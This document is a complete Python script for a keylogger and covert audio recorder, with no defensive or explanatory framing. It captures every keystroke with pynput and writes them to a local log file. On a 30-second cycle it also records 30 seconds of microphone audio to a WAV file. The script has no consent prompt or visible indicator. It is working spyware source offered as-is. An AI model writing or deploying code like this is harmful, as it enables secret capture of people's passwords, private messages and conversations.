import time, sounddevice, os
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write

main_path = os.path.dirname(os.path.realpath(__file__))

KEYLOGGER_ENABLED = True
INPUT_UPDATE_INTERVAL = 100
TIME_UPDATE_INTERVAL = 30
MIC_RECORDING_TIME = 30
MIC_SAMPLERATE = 44100
PATH = f"{main_path}/resources/"

run = True
count = 0
keys = []

current_time = time.time()
stopping_time = time.time() + TIME_UPDATE_INTERVAL

audio_information = "audio.wav"

def microphone():
    fs = MIC_SAMPLERATE
    seconds = MIC_RECORDING_TIME
    myrecording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
    sounddevice.wait()
    write(PATH + audio_information, fs, myrecording)

while run:

    def on_press(key):
        global keys, count, current_time

        current_time = time.time()
        keys.append(key)
        count += 1
        
        if count > INPUT_UPDATE_INTERVAL:
            write_file(keys)
            count = 0
            keys = []

    def write_file(keys):
        with open(f"{PATH}log.txt", "w") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write(" ")
                elif k.find("Key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:      
            return False
        if current_time > stopping_time:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if current_time > stopping_time:
        print("ayy")
        microphone()
        current_time = time.time()
        stopping_time = time.time() + TIME_UPDATE_INTERVAL
